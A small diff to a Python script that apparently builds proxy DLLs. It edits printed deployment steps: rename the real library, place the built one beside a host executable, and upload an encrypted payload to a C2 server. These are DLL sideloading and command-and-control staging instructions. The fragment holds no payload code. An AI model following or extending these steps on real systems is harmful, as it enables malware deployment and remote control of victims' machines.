@@ -416,7 +416,7 @@ def main():
     print(f"       - Rename real {orig_name} -> {renamed}")
     print(f"       - Place built {orig_name} alongside host executable")
     print(f"       - Place {renamed} in same directory")
-    print(f"       - Upload data.enc to C2 server")
+    print(f"       - Upload the encrypted payload (URL basename, e.g. payload.dat) to C2 server")
 
 
 if __name__ == "__main__":
